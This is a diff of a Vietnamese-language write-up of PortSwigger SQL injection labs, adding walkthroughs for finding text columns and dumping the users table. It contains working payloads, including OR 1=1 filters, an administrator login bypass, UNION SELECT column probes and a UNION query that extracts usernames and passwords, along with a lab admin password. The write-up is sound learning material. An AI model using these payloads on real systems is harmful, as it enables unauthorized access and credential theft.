@@ -14,7 +14,7 @@ Hậu quả của việc bị xâm phạm vào các thông tin nhạy cảm có 
 * Thông tin cá nhân.
 * Thông tin về tài khoản mật khẩu quan trọng như ví điện tử, mxh,... 
 
----
+
 ## LAB1: [Retrieving hidden data](https://https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-retrieving-hidden-data/sql-injection/lab-retrieve-hidden-data). 
 
 ![image](https://github.com/user-attachments/assets/737429d1-bdf7-4988-bad3-8e5467b9169d)
@@ -47,7 +47,7 @@ SELECT * FROM products WHERE category = 'Accessories' OR 1=1--';
 * OR 1=1: Luôn đúng → Kết quả trả về tất cả sản phẩm thay vì chỉ "Accessories".  
 * --: Đây là dấu comment trong SQL, giúp bỏ qua phần còn lại của truy vấn, tránh lỗi cú pháp.  
 
----
+
 
 ## LAB2: Subverting application logic 
 ![image](https://github.com/user-attachments/assets/7700dc91-c5a7-495f-a405-eef8b753d3ac) 
@@ -68,7 +68,7 @@ SELECT * FROM users WHERE username = 'administrator'--' AND password = '';
 ```
 chương trình sẽ hiểu là bỏ qua mật khẩu và sẽ đăng nhập thành công với tên người dùng hợp lệ.   
 
----
+
 
 ## SQL injection UNION attacks
 ```**Union**: là một lệnh trong sql cho phép kết hợp giá trị trả về của 2 hay nhiều truy vấn *SELECT* , sau đó trả về các bản ghi không bị trùng lập ( nếu trùng thì chỉ giữ lại 1 bản ghi).```
@@ -113,7 +113,7 @@ SELECT id, username, password FROM users WHERE username="xxx"
 UNION SELECT NULL, NULL, NULL;
 ```
 từ đó ta biết số cột trong truy vấn SELECT là 3.
-## LAB3: Lab: SQL injection UNION attack, determining the number of columns returned by the query.
+## LAB3 : Lab: SQL injection UNION attack, determining the number of columns returned by the query.
 ![image](https://github.com/user-attachments/assets/8ea443f5-907e-4ffd-b43c-5c11da5f0af2)
 Để giải lab này cần tìm đươc số cột của truy vấn. 
 Trong bài này hãy sử dụng Burpsuite để modify các request gửi tới nhé.
@@ -141,3 +141,48 @@ GET /filter?category=Lifestyle' UNION SELECT NULL, NULL, NULL--
 ![image](https://github.com/user-attachments/assets/ba912490-e8ad-4b4c-b524-02ae0611927e)  
 Sau khi gửi Request đi thì web đã báo mình hoàn thành bài lab.
 ![image](https://github.com/user-attachments/assets/90e6654a-500e-4429-9875-f3ac7a58c381) 
+## Finding columns with a useful data type 
+SQL injection UNION attack truy xuất thông tin từ các truy vấn được chèn vào, một điểu thú vị là các thông tin bạn muốn thường tương trích với kiểu string data. 
+Nên sau khi xác định được số columns cần thiết, bạn có thể thăm dò xem nó có chứa dữ liệu chuỗi không bằng cách nhập 1 loạt các ```SQL injection UNION attack```:
+```sql=
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+```
+Nếu kiểu dữ liệu của cột không tương thích thì nó sẽ trả về:
+```sql=
+Conversion failed when converting the varchar value 'a' to data type int.
+```
+## LAB4 : SQL injection UNION attack, finding a column containing text
+![image](https://github.com/user-attachments/assets/a28daddb-dffd-4a68-a07d-3bc209045459)
+### Xác định số Column (Determine number of columns).
+Đầu tiên mình sẽ dùng Burpsuite để intercept vào trang web trước để xác định số cột nhé, bước này mình sẽ dùng ORDER BY. 
+Sau khi thực hiện các thao tác như lab trước đó thì mình biết số column cần tìm là 3.
+![image](https://github.com/user-attachments/assets/7339f1e9-5d01-462c-889a-4d35958b59e0)  
+
+### Xác đỉnh column nào chứa kiểu dữ liệu string
+Mình sẽ thực hiện bằng cách chèn lần lượt vào nhé, Sau khi thử nhiều lần thì mình xác định chứa kiểu string sẽ ở cột thứ 2 nên mình sẽ chèn như này:
+```sql=
+' UNION SELECT NULL, 'abcdef', NULL--
+```
+![image](https://github.com/user-attachments/assets/35ea38e1-69d4-43c3-889b-8e5f4bc34308) 
+và thế là mình hoàn thành lab này. =))))
+
+
+## LAB5 : Using a SQL injection UNION attack to retrieve interesting data   
+
+![image](https://github.com/user-attachments/assets/416493c4-3588-4105-be84-48bb57ab78c4)
+
+Lab này mình vẫn làm các bước như lab trước là tìm số cột ( sau khi tìm là 2 ), và tìm số cột có kiểu string trong đó ( trường hợp này cũng là cả 2 cột ).
+Tiếp đến vì để đã cho biết tên của 2 columns và table rồi nên mình sẽ dựa vào đó để chèn query vào
+```sql=
+' UNION SELECT username, password FROM users --
+```
+![image](https://github.com/user-attachments/assets/8a0c7459-a1e0-4465-b509-2e9fd2cf15fc)
+
+qua đó mình sẽ thu được thông tin của adminstrator là:
+* **username= administrator**
+* **password= im4gh819ktv1fsmfx11z**
+![image](https://github.com/user-attachments/assets/5027451e-0792-4758-bf70-e925989c71d4)
+Mình đã thành công đăng nhập vào account của admin.
